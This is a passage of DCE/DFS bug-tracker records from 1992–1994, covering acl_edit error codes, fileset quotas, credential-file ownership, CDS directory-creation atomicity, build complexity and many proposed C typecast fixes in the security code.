Subcomponent Name             : acl manager
Short Description             : Wrong error on exit from acl_edit
Reported Date                 : 11/5/92
Found in Baseline             : 1.0.1
Found Date                    : 11/5/92
Severity                      : D
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[11/5/92 public]
Acl_edit is not issuing the correct error on exit:
# dce_login usera -dce-
# acl_edit lfs2_fs2 
sec_acl_edit> l
# SEC_ACL for lfs2_fs2:
# Default cell = /.../big
mask_obj:rwx-id
user_obj:rwxcid
group_obj:rwx---
other_obj:rwx---
sec_acl_edit> e
ERROR: acl object not found (dce / sec)
'e' for exit in acl_edit means rewrite the acl on the object that was
just listed (abort is exit without writing). The invoker must have 'c'
permission to update the ACL. Since in this case usera does not have
c permission, the rewrite is not allowed, but the error that is returned
should be object_not_found when the invoker has no permission and
not_authorized when the invoker has some permission but not the required
permission.  Since the invoker is in other_obj, the error should be
not_authorized.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[11/16/92 public]
 Actually, the owner should always have 'c' rights (6092).  As far as
I've been able to determine, the ONLY thing acl_edit says as an error
is "acl object not found".
Bruce, please verify that we are returning the correct error code
(EACCES vs. EPERM I believe).  If so, we should turn this into an
acl_edit bug.
Filled in Inter-dependent CRs with `6092' 
Changed Responsible Engr. from `mason@transarc.com' to `bwl@transarc.com'

[11/16/92 public]
In this case usera is NOT the owner, so, only has other_obj permissions.
I have also tried this on a namespace entry (CDS acl_mgr), and got the
behavior I describe above as appropriate (object_not_found when no perms,
not_authorized when user has some perms).

[12/9/92 public]
Part of the problem lies with security/client/acl/dfs_dce_acl.c.  This file
has the code that makes getacl and setacl syscalls and interprets the results.
On any error return from the syscalls, its functions always return
sec_acl_object_not_found.  They don't even bother to look at errno.  This
could be improved.  For instance, if errno is EPERM, they could return
sec_acl_not_authorized.
A more general problem is to communicate errors that can't be cleanly mapped
into Unix errno values.  For instance, when a setacl syscall is done that
tries to set the ``initial-container'' ACL of something that isn't a directory,
the getacl syscall is currently returning EINVAL.  Fine, but there are other
situations in which we return EINVAL; for instance, if the ACL fails
validation (dacl_epi_Validate returns error code).  These errors correspond
to different sec_acl codes, but they use the same Unix errno code.  This
illustrates a deficiency of the syscall interface.  To work around it,
perhaps the getacl and setacl syscalls could have an out-parameter into which
the ``real'' (sec_acl) error code can be written.

[1/4/92 public]
Added myself to the CC list, since another defect I opened (6683) turned out
to be a dup of this one.  Note:  As part of OT6548, I am adding a conversion
routine (from errno to DCE sec_acl errors), but that only solves part of the
problem since DFS is overloading errors like EINVAL (described above).

[1/5/93 public]
Just adding myself to the interest list.

[2/23/93 public]
Changed from enhancement to defect.  Not sure how it got marked
as an enh, maybe I opened it wrong to start with.  I didn't see
anything about that noted someone changing it.
Changed Defect or Enhancement? from `enh' to `def'

[8/16/93 public]
This is part of the task of sweeping old defects for OSF:
I took a close look at the ot5955 and also talked to Bruce about his original
concerns mentioned in the ot report.
                                                                               
The defect originally addressed two different problems. The first one was
that an user without an appropriate ACL while 'exit'ing the acl_edit could
get a non-meaningful error message.
                                                                               
For example, an user who has no write permission to file FOO when exiting
'acl_edit' may get
        ERROR: acl object not found (dce / sec)
instead of
        ERROR: operation on acl not authorized (dce / sec)
which is more appropriate after doing the following operation:
                                                                               
        # acl_edit FOO
        sec_acl_edit> l
        # SEC_ACL for FOO:
        # Default cell = /.../big
        mask_obj:rwx-id
        user_obj:rwxcid
        group_obj:rwx---
        other_obj:rwx---
        sec_acl_edit> e
        ERROR: acl object not found (dce / sec)
                                                                              
So far, this particular problem has been fixed by Mike Burati in his OT6548.
The second problem is that the DFS (the episode in this case) might not be able
to return an appropriate error message to the caller, acl_edit, after
experiencing some difficulty with reading/setting acl.
Here is Bruce's concern written in the ot report:
>
>....
>
>A more general problem is to communicate errors that can't be cleanly mapped
>into Unix errno values.  For instance, when a setacl syscall is done that
>tries to set the 'initial-container' ACL of something that isn't a directory,
>the getacl syscall is currently returning EINVAL.  Fine, but there are other
>situations in which we return EINVAL; for instance, if the ACL fails
>validation (dacl_epi_Validate returns error code).  These errors correspond
>to different sec_acl codes, but they use the same Unix errno code.  This
>illustrates a deficiency of the syscall interface.  To work around it,
>perhaps the getacl and setacl syscalls could have an out-parameter into which
>the ``real'' (sec_acl) error code can be written.
>
                                                                               
While Bruce's concern is legitimate, it actually takes more than just
modifying the setacl/getacl interface to return the exact error or an
appropriate error code to the caller.
                                                                               
The real problem is how DFS could properly map an internal error to an error
code that is recognized by both CM and acl_edit. The obvious choice is to use
the error codes exported by sec_acl defined in secsts.h.
                                                                              
However, coverting an internal DFS error code to an appropriate sec_acl code
could be a very cumbersome and time consuming process. Let's  take
function 'dacl_epi_Validate' (mentioned above)  as an example. Currently,
the Episode's efsx_setacl(), upon detecting an error from a call to
dacl_epi_Validate(), changes the returned error to EINVAL and then returns it
to caller. However, there could be hundreds of reasons that dacl_epi_Validate
fails. The internal errors coming from functions dacl_ParseAclDiskOption() and
dacl_ParseSyscallAcl(), etc., could be ranged from
DACL_ERROR_DUPLICATE_ENTRY_FOUND, DACL_ERROR_TOO_MANY_BYTES, to
DACL_ERROR_PARAMETER_ERROR, etc.
                                                                              
Mapping these error codes to a spectrum of sec_acl errors could be hard.
All internal error codes used in src/file/security/dac package and some of
Episode files have to be reviewed carefully. The changes would be pervasive.
In addition, even the converted error may still be meaningless to the acl_edit
or even to end users.
                                                                              
Given the minor functionality (to return a meaningful error code) we try to
achieve, I believe the amount of work needed to do it is really not justified.
I think that Bruce also shares my view in this regard.
                                                                               
Furthermore, this error conversion may also pose two potential issues need
to be resolved: 1) the setacl/getacl with a new syscall interface will not be
compatible with that of earlier (before 103) DFS/DCE releases.
Both DFS and acl_edit have to do some additional work to get around it.
2) Episode's vnop returning an sec_acl error not an Unix standard error may
cause some portable issues with a stand-alone Episode system (to be verified).
                                                                               
My recommendation on fixing the second problem of OT5955 is not to do it at
all. 
                                                                               
However, for now, mark it an enhancement for the record. 
tu
Changed Defect or Enhancement? from `def' to `enh' 
Changed H/W Ref Platform from `rs6000' to `all' 
Changed S/W Ref Platform from `aix' to `all' 
Changed Interest List CC from `burati' to `burati, tu@transarc.com' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'



CR Number                     : 5948
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : fts
Short Description             : fts setquota allows arbitrary quota to be set
Reported Date                 : 11/5/92
Found in Baseline             : 1.0.2
Found Date                    : 11/5/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[11/5/92 public]

fts setquota allows quota to be set to an arbitrary small value that 
prints usage well above 100% and this does not make sense. Does the following 
quota manipulation make sense?

# fts lsq -file rename_test
Fileset Name          Quota    Used  % Used   Aggregate
rename_test            5000      25     0%     1% = 263/16376 (LFS)
# fts setq -file rename_test -siz 10
# fts lsq -file rename_test
Fileset Name          Quota    Used  % Used   Aggregate
rename_test              10      25   250%<<   1% = 263/16376 (LFS)  <<WARNING
# fts setq -file rename_test -size 0
# fts lsq -file rename_test
Fileset Name          Quota    Used  % Used   Aggregate
rename_test               0      25     0%<<   1% = 263/16376 (LFS)  <<WARNING

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[11/6/92 public]
Yes, it's perfectly reasonable for ``fts setquota'' to set quotas larger
than the current usage.  (Suppose you were freezing out a user's fileset,
but wanted to let them be able to recover by deleting files.)

At best, one could view this as an enhancement requesting that when you set
the quota to zero the ``% Used'' column doesn't print as 0%.
Changed Defect or Enhancement? from `def' to `enh'



CR Number                     : 5918
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec
Short Description             : cred files should be owned by
uid, not euid
Reported Date                 : 11/4/92
Found in Baseline             : 1.0.2
Found Date                    : 11/4/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/4/92 public]

The cred files are owned by the effective uid of the process
logging in. But if a set-user-ID program does a dce login,
the resulting cred file will not be usable by the user who ran
the program, because the security runtime does not honor cred
files which are not owned by the current user.  There are various
possible workarounds for this in the set-user-ID program,
but they are not portable.  It would be better for the security
code to create the cred file owned by the real uid, not the effective
uid, of the program doing the dce login.



CR Number                     : 5908
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 2384
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : 
Non-atomic directory creation in cds
Reported Date                 : 11/3/92
Found in Baseline             : 1.0.1
Found Date                    : 11/3/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cds/server/db_directory.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/3/92 public]

        The folks at IBM toronto, write that they have been
        experiencing what they call a ghost directory problem
        (when they try to create a directory they are told
        the directory already exists and when they try to 
        delete the same directory they are told it does not
        exist).

        This problem normally occurs after the server
        execution thread abends abnormally (eg due to
        some CMA exception) and  during stress tests if
        transient run time errors (such as malloc failures)
        are encountered.

        They have concluded that this problem occurs because
        the cds server does not have a mechanism to handle
        abnormal terminations of the server thread which occur
        between the multiple operations required to create a
        directory object. The also believe they have located a
        couple of places in the code where return values are not 
        checked, and as a result run time errors can lead to
        to inconsistencies in the database structures maintained
        in memory.

        They also point out, that once such inconsistencies
        are created in the database, a checkpoint operation
        will make them permanent.

        They have included two examples scenarios, which they
        believe will cause this behavior. The first features the
        abnormal termination of the server thread in a critical
        section of code, The second is caused by a failed
        malloc call.

        Functions called during         Source file
        create directory
        -------------------------------------------------
        ta_create_dir                   server/ta_create.c
        ta_create_dir_record            server/ta_create.c
        db_dir_create                   server/db_directory.c
        db_dir_build                    server/db_directory.c
        db_pseudo_chdirectory           server/db_pseudo.c
        skulk_sched                     server/back_skulk.c
        set_insert                      server/sets_lib.c


         Function call hierarchy
         -------------------------------------------
               ta_create_dir
                  ta_create_dir_record
                     db_dir_create
                        db_dir_build
                           db_hash_insert
                        db_pseudo_chdirectory
                           set_insert
                  skulk_sched


        Abnormal termination :

        db_dir_build() function is called after checking
        the access rights of user, various validation
        checks, and building the directory record in
        memory with the state of directory set to RS_newDir.
        It allocates a directory bucket, initializes the b-tree
        and then calls db_hash_insert() to add the directory's
        UUID and its name to the hash tables.

        For the create directory operation, this is the
        first major update made to the database structures
        held in memory. They propose that an exception may
        occur at this point which terminates the server thread
        before it completes the creation of the dierctory.

        They reason, that since CDS does not have a mechanism
        to catch exceptions and undo the parially completed changes,
        the hash tables will continue to hold a hash entry for this
        directory. At the time of the failure, the RPC runtime will
        send some error message to inform the user that the requested
        operation was not successful. If the user then tries a
        second time to create the directory the user will recieve
        the error message 'Directory already exists'. At this point
        the user will also not be able to delete the directory.

        This inconsistent server database state may be remedied
        by restarting the server, since during server restart the
        database is reloaded and the hash tables are rebuilt.

        malloc failure  :

        After building the directory record in memory and
        adding the UUID of new directory to hash tables etc,
        db_dir_create() calls db_pseudo_chdirectory() to
        insert the new directory's UUID in the
        DNS_CHDIRECTORIES attribute of pseudo directory.
        This operation can fail due to lack of memory
        (see  set_insert() ) but the return code from
        db_pseudo_chdirectory() is not checked. One of
        the consequences of this unchecked failure is
        that the new directory may never get skulked
        by the periodic background skulk.

        If the skulk_sched() function, which is called
        just before ta_create_dir() exits, fails due to
        any reason then the state of directory will
        remain RS_newDir (not turned on). The background
        skulk also will not be able to change the directory
        state to RS_on because it has no knowledge of this
        directory.

        In this case any further attempts to  either
        create a new directory with the same name or
        delete this directory  will fail.

        Now if a checkpoint operation gets scheduled
        to save the database to disk then this problem
        will stay forever.

Repeat By:
        Very hard to recreate such intermittent problems.
        Code inspections and taking dump of the database
        is the most effective way to analyze and debug
        such problems.

        The other alternative is to insert some hooks
        in code to create the error scenarios described
        above.

Proposed Solution:

        Put TRY-CATCH-CATCHALL macros around ta_xxxx routines
        and around the critical sections of code (eg updates
        to pseudo directory , hash tables etc) so that it
        is possible to catch exceptions, undo the changes
        and free the allocated resources.

        Check the return codes and take an appropriate action.

[12/7/92 public]
We realize that there is some exposure in the areas cited, but we have not
seen problems occur in practice that weren't fixed by replaying the
server's transaction log, skulking, or background processing. If a problem
occurs during directory creation, it is a simple matter to delete an
orphaned child pointer, but even that is usually unnecessary.

Fixing the problem requires overall design changes and implementation work
that are beyond the scope of DCE 1.0.*.



CR Number                     : 5880
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : server
Short Description             : update should occur when
towers are added to clearinghouse
Reported Date                 : 10/30/92
Found in Baseline             : 1.0.2
Found Date                    : 10/30/92
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/30/92 public]

When a clearinghouse is created or moved, the towers for the clearinghouse
should be updated (to disk) immediately, not just written to core.
If the server is brought down before the towers are written out, the
server ends up unexporting and reexporting the sames towers to the
clearinghouse object when it is restarted.  This is an inefficiency,
not a serious problem.

-Peter

[10/25/93 public]
I would have defered this with 5915 last week but this ot was locked.
If we gt a fix for this it will go into the unintegrated tree.

[7/21/94 public]
This is an enhancement request.  It works currently.  Yes there is 
a slight inefficiency if you move you clearinghouse and crash before
a checkpoint, but this isn't going to happen alot and if it does
the server recreates the update.

Changed to enhancement.



CR Number                     : 5875
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : build
Short Description             : build directory structure complex
Reported Date                 : 10/30/92
Found in Baseline             : 1.0.2b1
Found Date                    : 10/30/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/30/92 public]

    The DCE Security software is built in various stages inside a large
    number of subdirectories with long lists of directories to be searched
    when compiling modules.  To build the software on VMS requires that we
    emulate the UN*X build procedures, which are very complex. Furthermore,
    our source code management system (CMS) imposes limits on what we can
    and cannot do in setting up a source code library.

    (We have also noted that there have been a large number of edits to the
    build procedures.  This would seem to suggest that the build procedures
    are a source of maintenance problems.)

    SUGGESTION: Reduce the number of subdirectories.

    SUGGESTION: Avoid file name collisions (such as /client/admin/acl_edit/
                tty.c and /client/admin/rgy_edit/tty.c).

[11/17/92 public]
Ok, I'll agree the build structure is complex, but it is not causing build
problems on any of the reference platforms, so this shouldn't be a B2 defect.
Given the number of high priority defects we've been getting, this won't be
considered for 1.0.2, so it's now an enhancement request that we'll think
about post1.0.2.



CR Number                     : 5873
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : security/krb5/clients/kinit/kinit.c
Short Description             : typecasting problem in kinit
Reported Date                 : 10/30/92
Found in Baseline             : 1.0.1
Found Date                    : 10/30/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/30/92 public]

The following is still in 1./0.2.

File:    security/krb5/clients/kinit/kinit.c
Problem: typecasting

  Line - 445
        printf("%s: ticket expires at %s", client_string,
            ctime(&my_creds.times.endtime));
    should be:
        printf("%s: ticket expires at %s", client_string,
            ctime((const time_t *) &my_creds.times.endtime));

[07/12/93 public]
It is not clear to me that just adding the cast is the right thing
to do.  my_creds.times.endtime is a krb5_timestamp, which is
a krb5_int32.  Adding the cast is only right if sizeof(time_t) ==
sizeof(krb5_int32); is that guaranteed?  If not, you'll need to add
a time_t local variable and use that.



CR Number                     : 5872
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : security/client routines
Short Description             : security/client - miscellaneous typecast problems
Reported Date                 : 10/30/92
Found in Baseline             : 1.0.1
Found Date                    : 10/30/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : client/rca/sec{idmap,_lrgy}.c, client/admin/acl_edit/deif.c, client/login/sec_login{_pvt}.c
Sensitivity                   : public

[10/30/92 public]

The following problems still exist in 1.0.2.

  >  File:    security/client/admin/acl_edit/deif
  >  Problem: wrong definition
  >  
  >    Line - 1364
  >           #define NUM_TYPES 13
  >      should be:
  >           #define NUM_TYPES 12
  >  
  >  
  >  File:    security/client/rca/secidmap
  >  Problem: typecasting
  >  
  >    Line - 332
  >  #define NEXT_FIELD     \
  >      do { line = cp; cp = (unsigned char *)u_strchr (line, FS); if (!cp) return NULL; *cp++ = NULL; \
  >           if (*cp==' ') cp++;  \
  >      } while (0)
  >      should be:
  >  #define NEXT_FIELD     \
  >      do { line = cp; cp = (unsigned char *)u_strchr (line, FS); if (!cp) return NULL; *cp++ = '\0'; \
  >           if (*cp==' ') cp++;  \
  >      } while (0)
  >  
  >  
  >  File:    security/client/login/sec_login
  >  Problem: typecasting
  >  
  >    Line - 1290
  >      *identity_expiration = NULL;
  >      should be:
  >      *identity_expiration = 0;
  >  
  >
  >  File:    security/client/login/sec_login_pvt
  >  Problem: typecasting
  >  
  >    Line - 2685
  >          *stp = krb5_process_as_reply(&KRB_REQUEST_INFO(lcp)->reply,
  >                                      KRB_REQUEST_INFO(lcp)->nonce,
  >                                      KRB_REQUEST_INFO(lcp)->options,
  >                                      KRB_REQUEST_INFO(lcp)->addrs,
  >                                      KEYTYPE_DES, pwd_keyproc, &pwd_keyseed,
  >                                      krb5_kdc_rep_decrypt_proc, 0,
  >                                      &KRB_REQUEST_INFO(lcp)->creds,
  >                                      &as_reply);
  >      should be:
  >          *stp = krb5_process_as_reply(&KRB_REQUEST_INFO(lcp)->reply,
  >                                      KRB_REQUEST_INFO(lcp)->nonce,
  >                                      KRB_REQUEST_INFO(lcp)->options,
  >                                      KRB_REQUEST_INFO(lcp)->addrs,
  >                                      KEYTYPE_DES,
  >                                      (krb5_error_code (*)
  >                                            (const krb5_keytype,
  >                                             krb5_keyblock **,
  >                                             krb5_const_pointer,
  >                                             krb5_pa_data **))pwd_keyproc,
  >                                      &pwd_keyseed,
  >                                      krb5_kdc_rep_decrypt_proc, 0,
  >                                      &KRB_REQUEST_INFO(lcp)->creds,
  >                                      &as_reply);
  >  
  >  
  >  File:    security/client/rca/sec_lrgy
  >  Problem: typecasting
  >  
  >    Line - 417
  >      p = *var_ptr = malloc(fixed->var_len);
  >      should be:
  >      p = *var_ptr = (char *) malloc(fixed->var_len);
  >

[12/17/92 public]
Submitted fixed deif.c, secidmap.c, sec_lrgy.c, still working on sec_login.c,
need better fix than described above for sec_login_pvt.c

[12/17/92 public]
Submitted fix for sec_login.c as part of 6295, only one left now is the fix for
sec_login_pvt.c, which we need a cleaner fix for than the one described above.



CR Number                     : 5857
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : security/utils routines
Short Description             : security/utils - miscellaneous typecast problems
Reported Date                 : 10/29/92
Found in Baseline             : 1.0.1
Found Date                    : 10/29/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/29/92 public]

The following problems also exist in the current 1.0.2 code base.


File:    security/utils/sec_authn.c
Problem: typecasting

  Line - 340
    if (SEC_LOCAL_NAME(name) != NULL) {
    should be:
    if (SEC_LOCAL_NAME(name) != 0) {

         ***************************************************

File:    security/utils/crypt.c
Problem: typecasting

  Line - 230
     return cc;
    should be:
     return (void *)cc;

         ***************************************************

File:    security/utils/sec_krb_util.c
Problem: typecasting

  Line - 220
    *rp++ = NULL;
    should be:
    *rp++ = '\0';

  Line - 395
        *rp1++ = NULL;
    should be:
        *rp1++ = '\0';

  Line - 403
        *rp2++ = NULL;
    should be:
        *rp2++ = '\0';

  Line - 638
    krb5_cksumtype  krb_sum_type = NULL;
    should be:
    krb5_cksumtype  krb_sum_type = 0;

         ***************************************************

File:    security/utils/u_str.c
Problem: typecasting

  Line - 51, 75
    if ((source != NULL) && (*source != NULL)) {
    should be:
    if ((source != NULL) && (*source != '\0')) {

         ***************************************************

[10/29/92 public]
Changed to an enhancement since this is currently not an issue 
for building on the reference platforms.



CR Number                     : 5856
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : security/helper/auth_helper.c
Short Description             : security/helper - miscellaneous typecast problems
Reported Date                 : 10/29/92
Found in Baseline             : 1.0.1
Found Date                    : 10/29/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/29/92 public]

The following problems also exist in current 1.0.2 code base.

File:    security/helper/auth_helper.c
Problem: typecasting

  Line - 236
        context_cache[slot].pathname = rpc__stralloc (pathname_buf);
    should be:
        context_cache[slot].pathname =
              (char *) rpc__stralloc (pathname_buf);

  Line - 710
        time (&helper_now);
    should be:
        time ((long *) &helper_now);

[10/29/92 public]
Changed to an enhancement since this is not an issue for building
on the reference platforms.

[07/12/93 public]
I think there are a number of errors here.  In the first one, rpc__stralloc()
should be declared properly, not have its return value casted.
The (long*) cast needed in time() (line 710) is wrong.  time takes
a time_t* not a long*.



CR Number                     : 5854
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : sec
Subcomponent Name             : sec server routines
Short Description             : security/server - miscellaneous typecast problems
Reported Date                 : 10/29/92
Found in Baseline             : 1.0.1
Found Date                    : 10/29/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/29/92 public]

The following problems also exist in the current 1.0.2 code base.



File:    security/server/rsdb/balanced_trees.c
Problem: syntax error

  Line - 86
    typedef enum { IMPLANT, NOT_FOUND, REPLACED, DUPLICATE, } result_t;
    should be:
    typedef enum { IMPLANT, NOT_FOUND,
                   REPLACED, DUPLICATE } result_t;

         ***************************************************

File:    security/server/sec_clientd/sec_clientd.c
Problem: parameter conflict

  Line - 97
    time_info = *localtime(&now.tv_sec);
    should be:
    time_info = *localtime((long *)&now.tv_sec);

  Line - 125
    time_info = *localtime(&now.tv_sec);
    should be:
    time_info = *localtime((long *)&now.tv_sec);

  Line - 639
            if (! scd_thread_join(listener_handle, &result_p) ) {
    should be:
            if (! scd_thread_join(listener_handle,
                   (void *)&result_p) ) {

         ***************************************************

File:    security/server/rsdb/rsdb_acct.c
Problem: typecasting

  Line - 975
    acct->flags      = NULL;
    should be:
    acct->flags      = 0;

         ***************************************************

File:    security/server/rsdb/rsdb_acl.c
Problem: typecasting

  Line - 148
    rsdb_fetch(rsdb_acl_db, (Pointer) &sequential_key, sizeof(sequential_key),
                        &data, &data_len, st);
    should be:
    rsdb_fetch(rsdb_acl_db, (Pointer) &sequential_key, sizeof(sequential_key),
                        &data, (int *)&data_len, st);

  Line - 194
    rsdb_fetch(rsdb_acl_db, (Pointer) &sequential_key, sizeof(sequential_key),
                        &data, &data_len, st);
    should be:
    rsdb_fetch(rsdb_acl_db, (Pointer) &sequential_key, sizeof(sequential_key),
                        &data, (int *)&data_len, st);

  Line - 899
    if(BAD_STATUS(st)) {
        return NULL;
    should be:
    if(BAD_STATUS(st)) {
        return ( (unsigned long)0 );

  Line - 1020
    rsdb_fetch(rsdb_acl_db, (Pointer) &sequential_key, sizeof(sequential_key),
                        &data, &data_len, st);
    should be:
    rsdb_fetch(rsdb_acl_db, (Pointer) &sequential_key, sizeof(sequential_key),
                        &data, (int *)&data_len, st);

  Line - 1204
    if(acl_ids->acl_id == NULL) {
    should be:
    if(acl_ids->acl_id == (unsigned long)0 ) {

         ***************************************************

File:    security/server/rsdb/rsdb_daclmgr.c
Problem: typecasting

  Line - 1194
    if(key_ids->acl_id == NULL) {
    should be:
    if(key_ids->acl_id == (unsigned long)0 ) {

File:    security/server/rsdb/rsdb_dir_util.c
Problem: typecasting

  Line - 122
    rsdb_fetch(domain_info[domain].db, (Pointer)&uid_key,
               sizeof(uid_key), &name_key, &name_key_len, &status);
    should be:
    rsdb_fetch(domain_info[domain].db, (Pointer)&uid_key,
               sizeof(uid_key), &name_key,
               (int *)&name_key_len, &status);

         ***************************************************

File:    security/server/rsdb/rsdb_pgo.c
Problem: typecasting

  Line - 516
    item->fullname[pgo->fullname_len] = NULL;
    should be:
    item->fullname[pgo->fullname_len] = '\0';

  Line - 868
        } while ((previous_pgo_p == NULL) &&
                 (previous_pgo.body.threads.alias != NULL));
    should be:
        } while ((previous_pgo_p == NULL) &&
                 (previous_pgo.body.threads.alias != 0 ));

  Line - 1237
    *name = NULL;
    should be:
    *name = '\0';

  Line - 1277
    *name = NULL;
    should be:
    *name = '\0';

  Line - 1475
        name[name_len] = NULL;
    should be:
        name[name_len] = '\0';

  Line - 1510
        name[name_len] = NULL;
    should be:
        name[name_len] = '\0';

  Line - 1807
            member_list[num][member_len] = NULL;
    should be:
            member_list[num][member_len] = '\0';

         ***************************************************

File:    security/server/rsdb/rsdb_replica.c
Problem: typecasting

  Line - 426
    rsdb_fetch_next(rsdb_replica_db, (Pointer) rs_id,
                    (rs_id == NULL ? 0 : sizeof(*rs_id)),
                    (Pointer *) &next_id_p, &next_id_len,
                    (Pointer *) &rsdb_rep_item_p, &item_len, st);
    should be:
    rsdb_fetch_next(rsdb_replica_db, (Pointer) rs_id,
                    (rs_id == NULL ? 0 : sizeof(*rs_id)),
                    (Pointer *) &next_id_p,
                    (int *)&next_id_len,
                    (Pointer *) &rsdb_rep_item_p,
                    (int *)&item_len, st);

         ***************************************************

File:    security/server/rsdb/rsdb_util.c
Problem: typecasting

  Line - 84
    rsdb_fetch(domain_info[domain].db, (Pointer) &sequential_key,
               sizeof(sequential_key),
                                &name_key, &name_key_len, &st);
    should be:
    rsdb_fetch(domain_info[domain].db, (Pointer) &sequential_key,
               sizeof(sequential_key),
               &name_key, (int *)&name_key_len, &st);

  Line - 595
    rsdb_util_path_resolve(domain, residual, &residual_len, resolved, &resolved_len,
                            &item, status);
    should be:
    rsdb_util_path_resolve(domain, residual,
          (long int*)&residual_len, resolved,
          (long int*)&resolved_len, &item, status);

  Line - 698
        rsdb_util_path_resolve(*domain, obj_name, &obj_name_len, resolved,
                               &resolved_len, object, st);
    should be:
        rsdb_util_path_resolve(*domain, obj_name,
                    (long int*)&obj_name_len, resolved,
                    (long int*)&resolved_len, object, st);

  Line - 1210
    rsdb_fetch(domain_info[domain].db, key, key_len, &data, &data_len, &st);
    should be:
    rsdb_fetch(domain_info[domain].db, key, key_len, &data,
               (int *)&data_len, &st);

  Line - 1338
    rsdb_fetch_next(domain_info[domain].db, (Pointer) & name_key, name_key_len,
                    &next_key, &next_key_len,
                    &data, &data_len, status);
    should be:
    rsdb_fetch_next(domain_info[domain].db, (Pointer) & name_key, name_key_len,
                    &next_key, (int *)&next_key_len,
                    &data, (int *)&data_len, status);

  Line - 1508
    rsdb_fetch(domain_info[domain].db, (Pointer) &mem_key,
               sizeof(mem_key), &data, &data_len, &st);
    should be:
    rsdb_fetch(domain_info[domain].db, (Pointer) &mem_key,
       sizeof(mem_key), &data, (int *)&data_len, &st);

         ***************************************************

File:    security/server/rs/rpriv.c
Problem: typecasting

  Line - 459
        sec_id_pac_t_unpickle(ppac, malloc, authz_data, stp);
    should be:
        sec_id_pac_t_unpickle(ppac,
         (void *(*) (unsigned32))malloc, authz_data, stp);

         ***************************************************

File:    security/server/rs/rs_audit_trail.c
Problem: typecasting

  Line - 181
        strcpy(time_buf, ctime(&tv.tv_sec));
    should be:
        strcpy(time_buf, ctime((long *)&tv.tv_sec));

         ***************************************************

File:    security/server/rsdb/rsdb.c
Problem: typecasting & bug in directory name

  Line - 288
#define RGY_XXX_TMP  "/tmp/rgy_data.bak"
    should be:
#define RGY_XXX_TMP  "/tmp/rgy_data.bak/"

  Line - 539
            printf("%s Checkpoint on %s", rs_prod_name, ctime(&tv.tv_sec));
    should be:
